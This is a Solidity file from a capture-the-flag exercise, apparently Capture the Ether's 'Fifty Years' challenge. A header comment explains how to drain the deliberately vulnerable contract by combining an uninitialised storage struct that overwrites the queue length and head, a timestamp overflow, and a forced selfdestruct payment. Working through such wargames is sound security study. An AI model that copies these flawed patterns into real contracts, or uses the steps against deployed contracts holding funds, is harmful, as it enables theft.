/*

in this challenge, there are multiple vulnerabilities than needs to be expolited in order to pass it


1 - the struct declaration in upsert writes to slot 0 and 1

2 - overflow issue in the + 1 day require statement

# calculate 1 day in seconds (Solidity docs : https://docs.soliditylang.org/en/v0.8.6/units-and-global-variables.html#time-units)

ONE_DAY = 24 * 60 * 60



# call upsert with (1, 2**256 - ONE_DAY) with 1 wei as value

after this call

queue length = 2
head = 2**256 - ONE_DAY
value = 1 wei
queue[1].unlockTimestamp = 2**256 - ONE_DAY


# now if we call upsert with (2,0) , queue[queue.length - 1].unlockTimestamp + 1 days will overflow and match 0 as timestamp
queue length = 3
head = 0


# now we have to selfdestrcut a contract with 3 wei to the challenge contract
because in the push statement the slot 0 holds the length on the queue and the push increments it by 1

queue.push(contribution); 


# call withdraw(2)
# 


*/
pragma solidity ^0.4.21;

contract FiftyYearsChallenge {
    struct Contribution {
        uint256 amount;
        uint256 unlockTimestamp;
    }
    Contribution[] queue;
    uint256 head;

    address owner;
    function FiftyYearsChallenge(address player) public payable {
        require(msg.value == 1 ether);

        owner = player;
        queue.push(Contribution(msg.value, now + 50 years));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function upsert(uint256 index, uint256 timestamp) public payable {
        require(msg.sender == owner);

        if (index >= head && index < queue.length) {
            // Update existing contribution amount without updating timestamp.
            Contribution storage contribution = queue[index];
            contribution.amount += msg.value;
        } else {
            // Append a new contribution. Require that each contribution unlock
            // at least 1 day after the previous one.
            require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days);

            contribution.amount = msg.value;
            contribution.unlockTimestamp = timestamp;
            queue.push(contribution);
        }
    }

    function withdraw(uint256 index) public {
        require(msg.sender == owner);
        require(now >= queue[index].unlockTimestamp);

        // Withdraw this and any earlier contributions.
        uint256 total = 0;
        for (uint256 i = head; i <= index; i++) {
            total += queue[i].amount;

            // Reclaim storage.
            delete queue[i];
        }

        // Move the head of the queue forward so we don't have to loop over
        // already-withdrawn contributions.
        head = index + 1;

        msg.sender.transfer(total);
    }
}